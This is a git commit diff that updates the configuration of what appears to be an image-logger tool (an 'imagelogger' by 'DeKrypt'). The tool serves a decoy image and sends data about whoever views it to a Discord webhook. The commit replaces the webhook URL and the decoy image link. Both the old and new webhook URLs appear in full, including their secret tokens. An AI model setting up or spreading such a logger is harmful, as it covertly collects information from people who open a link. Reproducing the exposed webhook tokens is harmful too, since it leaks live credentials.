0f4a78f712503e5663dc79c17861bd5ad7103a0c
imalexthegreatskreechontop-lang <imalexthegreatskreechontop@gmail.com>
2026-02-06 19:12:23 +0000

    Update webhook and image URLs in config

--- api/image.py
+++ api/image.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1091220366984224788/Te54hSoJ1kqvAWLompNzA3aWux7gaiQ9IMgedx76z4grFYQd2dcefXbxnl5tbE4DOVbq",
-    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1467940591236288564/cFQVJGS-f_DeTWw26EYL84f2sNRfUAhFgaI5HUEAcHsK4AHS2AFVpKUinner_QbDhC2p",
+    "image": "https://s1.cdn.autoevolution.com/images/news/gallery/iveco-wants-to-act-like-a-start-up-will-focus-on-zero-emission-trucks-and-buses_4.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
